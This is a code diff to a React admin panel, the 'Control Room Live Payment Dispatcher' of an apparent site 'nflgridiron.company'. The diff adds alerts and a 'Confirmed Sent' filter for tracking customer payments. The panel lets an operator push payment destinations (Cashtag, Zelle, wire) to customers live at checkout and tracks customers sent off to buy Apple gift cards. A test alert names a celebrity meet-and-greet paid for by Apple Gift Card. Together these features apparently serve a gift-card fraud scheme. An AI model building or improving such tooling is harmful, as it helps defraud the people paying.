@@ -23,7 +23,8 @@ import {
   RefreshCw,
   ExternalLink,
   Mail,
-  MessageSquare
+  MessageSquare,
+  Bell
 } from "lucide-react";
 import { 
   PaymentSession, 
@@ -36,7 +37,9 @@ import {
   deletePaymentSession,
   deletePaymentSessions,
   buildAdminDetailsFromPresets,
-  sendSessionMailMessage
+  sendSessionMailMessage,
+  fetchAdminEmailStatus,
+  notifyAdminEmailAlert
 } from "../../services/paymentControlService";
 import { approveControlRoomSession } from "../../utils/orderSync";
 
@@ -53,8 +56,18 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
   const [isSavingPresets, setIsSavingPresets] = useState(false);
   const [isDeleting, setIsDeleting] = useState(false);
   const [successToast, setSuccessToast] = useState<string | null>(null);
-  const [activeFilter, setActiveFilter] = useState<"all" | "apple_redirect" | "awaiting" | "unresponsive" | "submitted">("all");
+  const [activeFilter, setActiveFilter] = useState<"all" | "confirmed_sent" | "apple_redirect" | "awaiting" | "unresponsive" | "submitted">("all");
   const [searchQuery, setSearchQuery] = useState("");
+  const [emailStatus, setEmailStatus] = useState<{
+    emailConfigured: boolean;
+    provider: string;
+    recipient: string;
+  }>({ emailConfigured: false, provider: "none", recipient: "support@nflgridiron.company" });
+  const [isTestingEmail, setIsTestingEmail] = useState(false);
+  const [notifPermission, setNotifPermission] = useState<NotificationPermission | "unsupported">(() => {
+    if (typeof window === "undefined" || !("Notification" in window)) return "unsupported";
+    return Notification.permission;
+  });
 
   // Direct Website Mail Composer State (no external email needed)
   const [messageModalSession, setMessageModalSession] = useState<PaymentSession | null>(null);
@@ -116,9 +129,55 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
     return () => unsub();
   }, []);
 
+  // Fetch live mail transport configuration for support@nflgridiron.company
+  useEffect(() => {
+    fetchAdminEmailStatus().then(setEmailStatus).catch(() => {});
+  }, []);
+
   const showNotification = (msg: string) => {
     setSuccessToast(msg);
-    setTimeout(() => setSuccessToast(null), 4000);
+    setTimeout(() => setSuccessToast(null), 4500);
+  };
+
+  const handleRequestBrowserNotifications = async () => {
+    if (typeof window === "undefined" || !("Notification" in window)) return;
+    try {
+      const perm = await Notification.requestPermission();
+      setNotifPermission(perm);
+      if (perm === "granted") {
+        showNotification("Browser desktop alerts enabled for incoming payment requests & sent confirmations!");
+      }
+    } catch {
+      // ignore permission prompt error
+    }
+  };
+
+  const handleSendTestAlertEmail = async () => {
+    if (isTestingEmail) return;
+    setIsTestingEmail(true);
+    try {
+      const res = await notifyAdminEmailAlert({
+        eventType: "test_alert",
+        sessionId: `TEST-${Date.now()}`,
+        customerName: "Admin Verification Test",
+        customerEmail: "alexwtchmn@gmail.com",
+        itemTitle: "CeeDee Lamb Public Meet & Greet Alert Test",
+        amount: 95,
+        paymentMethod: "Apple Gift Card",
+        force: true,
+      });
+      if (res.ok) {
+        showNotification(`Test email alert delivered to ${res.recipient || emailStatus.recipient}!`);
+      } else {
+        showNotification(
+          res.message ||
+            res.error ||
+            `Mail transport not configured yet — add RESEND_API_KEY or SMTP_* in Secrets.`
+        );
+      }
+    } finally {
+      setIsTestingEmail(false);
+    }
   };
 
   const handleApproveSession = async (s: PaymentSession) => {
@@ -355,6 +414,12 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
   };
 
   // Helper groupings
+  const confirmedSentCount = sessions.filter(
+    s => Boolean(s.customerConfirmedSent) || s.status === "payment_submitted"
+  ).length;
+  const pendingConfirmedSentCount = sessions.filter(
+    s => (Boolean(s.customerConfirmedSent) || s.status === "payment_submitted") && s.status !== "completed"
+  ).length;
   const appleRedirectCount = sessions.filter(
     s => s.status === "apple_partner_redirect" || (Boolean(s.leftSiteForApplePurchase) && s.status !== "completed")
   ).length;
@@ -367,11 +432,13 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
     s => s.status === "payment_submitted" || Boolean(s.receiptUrl)
   ).length;
 
-  // Filtered session list
+  // Filtered session list (prioritize confirmed sent & awaiting at top when viewing All)
   const filteredSessions = sessions.filter((s) => {
+    const isConfirmedSent = Boolean(s.customerConfirmedSent) || s.status === "payment_submitted";
     const isAppleRedirect =
       s.status === "apple_partner_redirect" || (Boolean(s.leftSiteForApplePurchase) && s.status !== "completed");
     // Tab filter
+    if (activeFilter === "confirmed_sent" && !isConfirmedSent) return false;
     if (activeFilter === "apple_redirect" && !isAppleRedirect) return false;
     if (activeFilter === "awaiting" && s.status !== "awaiting_admin_details") return false;
     if (activeFilter === "unresponsive") {
@@ -421,6 +488,11 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
             <h3 className="text-sm font-black uppercase text-white tracking-wider">
               Control Room Live Payment Dispatcher
             </h3>
+            {pendingConfirmedSentCount > 0 && (
+              <span className="animate-pulse px-2.5 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-400/50 text-emerald-300 font-mono text-[10px] font-black uppercase">
+                {pendingConfirmedSentCount} Confirmed Sent
+              </span>
+            )}
             {awaitingCount > 0 && (
               <span className="animate-pulse px-2.5 py-0.5 rounded-full bg-amber-500/20 border border-amber-500/40 text-amber-300 font-mono text-[10px] font-black uppercase">
                 {awaitingCount} Awaiting Details
@@ -433,11 +505,22 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
             )}
           </div>
           <p className="text-xs text-zinc-400 mt-1">
-            Input verified payment destination details (Cashtag, Zelle, Bank, Wire, PayPal) directly to customers currently on the checkout screen in real-time.
+            Input verified payment destination details directly to customers in real-time and approve customers who confirm payment sent.
           </p>
         </div>
 
         <div className="flex items-center gap-2 flex-wrap">
+          {notifPermission !== "unsupported" && notifPermission !== "granted" && (
+            <button
+              type="button"
+              onClick={handleRequestBrowserNotifications}
+              className="px-3.5 py-2.5 bg-sky-500/15 hover:bg-sky-500/25 border border-sky-400/40 text-sky-300 font-black text-xs uppercase tracking-wider rounded-2xl flex items-center gap-1.5 transition-all cursor-pointer"
+            >
+              <Bell className="w-3.5 h-3.5" />
+              Enable Alerts
+            </button>
+          )}
+
           {unresponsiveCount > 0 && (
             <button
               type="button"
@@ -460,6 +543,38 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
         </div>
       </div>
 
+      {/* Email Alert Gateway Status Banner -> support@nflgridiron.company */}
+      <div className={`p-4 rounded-2xl border flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs ${
+        emailStatus.emailConfigured
+          ? "bg-emerald-500/10 border-emerald-500/35"
+          : "bg-amber-500/10 border-amber-500/35"
+      }`}>
+        <div className="flex items-start gap-2.5">
+          <Mail className={`w-4 h-4 shrink-0 mt-0.5 ${emailStatus.emailConfigured ? "text-emerald-400" : "text-amber-400"}`} />
+          <div className="space-y-0.5">
+            <p className="font-black uppercase tracking-wider text-white">
+              {emailStatus.emailConfigured
+                ? `Mail Alerts Active (${emailStatus.provider.toUpperCase()}) -> ${emailStatus.recipient}`
+                : `Mail Alerts Target: ${emailStatus.recipient} (SMTP / Resend Secret Needed)`}
+            </p>
+            <p className="text-[11px] text-zinc-300 leading-snug">
+              {emailStatus.emailConfigured
+                ? `Immediate email alerts are dispatched to ${emailStatus.recipient} whenever a customer requests payment details or confirms payment sent.`
+                : `In-app & browser notifications are active right now. To also forward emails into ${emailStatus.recipient}, add RESEND_API_KEY (or SMTP_HOST, SMTP_USER, SMTP_PASS) in AI Studio Secrets.`}
+            </p>
+          </div>
+        </div>
+        <button
+          type="button"
+          onClick={handleSendTestAlertEmail}
+          disabled={isTestingEmail}
+          className="min-h-[38px] px-3.5 py-2 rounded-xl bg-zinc-900 hover:bg-zinc-800 border border-white/15 text-white font-bold text-[11px] uppercase tracking-wider inline-flex items-center justify-center gap-1.5 shrink-0 cursor-pointer"
+        >
+          {isTestingEmail ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5 text-sky-400" />}
+          <span>{isTestingEmail ? "Testing..." : "Test Mail Alert"}</span>
+        </button>
+      </div>
+
       {/* Filter Tabs & Search Bar */}
       <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-zinc-950/60 p-3 rounded-2xl border border-white/5">
         <div className="flex items-center gap-1.5 overflow-x-auto pb-1 sm:pb-0">
@@ -473,6 +588,20 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
             }`}
           >
             All Orders ({sessions.length})
+          </button>
+
+          <button
+            type="button"
+            onClick={() => setActiveFilter("confirmed_sent")}
+            className={`px-3 py-1.5 rounded-xl text-xs font-black uppercase tracking-wider transition-all cursor-pointer whitespace-nowrap ${
+              activeFilter === "confirmed_sent"
+                ? "bg-emerald-500 text-black shadow"
+                : pendingConfirmedSentCount > 0
+                ? "bg-emerald-500/20 text-emerald-300 hover:text-white border border-emerald-400/50 animate-pulse"
+                : "bg-zinc-900 text-zinc-400 hover:text-white border border-white/5"
+            }`}
+          >
+            Confirmed Sent ({confirmedSentCount})
           </button>
 
           <button
@@ -495,6 +624,8 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
             className={`px-3 py-1.5 rounded-xl text-xs font-black uppercase tracking-wider transition-all cursor-pointer whitespace-nowrap ${
               activeFilter === "awaiting"
                 ? "bg-amber-500 text-black shadow"
+                : awaitingCount > 0
+                ? "bg-amber-500/15 text-amber-300 hover:text-white border border-amber-500/40"
                 : "bg-zinc-900 text-zinc-400 hover:text-white border border-white/5"
             }`}
           >
@@ -575,10 +706,11 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
           <div className="grid grid-cols-1 gap-3">
             {filteredSessions.map((s) => {
               const isCompleted = s.status === "completed";
+              const isConfirmedSent = Boolean(s.customerConfirmedSent);
               const isAppleRedirect =
                 !isCompleted && (s.status === "apple_partner_redirect" || Boolean(s.leftSiteForApplePurchase));
               const isAwaiting = s.status === "awaiting_admin_details";
-              const isSubmitted = s.status === "payment_submitted";
+              const isSubmitted = s.status === "payment_submitted" || isConfirmedSent;
               const isProvided = s.status === "details_provided";
               const isUnresponsive = isProvided && !s.referenceTag && !s.receiptUrl;
 
@@ -588,12 +720,12 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
                   className={`p-4 rounded-2xl border transition-all flex flex-col md:flex-row md:items-center justify-between gap-4 ${
                     isCompleted
                       ? "bg-emerald-500/5 border-emerald-500/35"
+                      : isSubmitted
+                      ? "bg-emerald-500/10 border-emerald-400/45 shadow-lg shadow-emerald-500/10"
                       : isAppleRedirect
                       ? "bg-violet-500/5 border-violet-500/35 shadow-lg shadow-violet-500/5"
                       : isAwaiting
                       ? "bg-amber-500/5 border-amber-500/30 shadow-lg shadow-amber-500/5"
-                      : isSubmitted
-                      ? "bg-emerald-500/5 border-emerald-500/30"
                       : isUnresponsive
                       ? "bg-zinc-950 border-amber-500/20"
                       : "bg-zinc-950 border-white/5"
@@ -608,12 +740,12 @@ export const ControlRoomPaymentDispatcher: React.FC = () => {
                       <span className={`text-[9px] font-black uppercase px-2 py-0.5 rounded-full ${
                         isCompleted
                           ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40"
+                          : isSubmitted
+                          ? "bg-emerald-500/25 text-emerald-300 border border-emerald-400/50"
                           : isAppleRedirect
                           ? "bg-violet-500/20 text-violet-300 border border-violet-500/40"
                           : isAwaiting
                           ? "bg-amber-500/20 text-amber-300 border border-amber-500/30 animate-pulse"
-                          : isSubmitted
-                          ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30"
                           : isUnresponsive
                           ? "bg-red-500/20 text-red-300 border border-red-500/30"
                           : "bg-blue-500/20 text-blue-300 border border-blue-500/30"
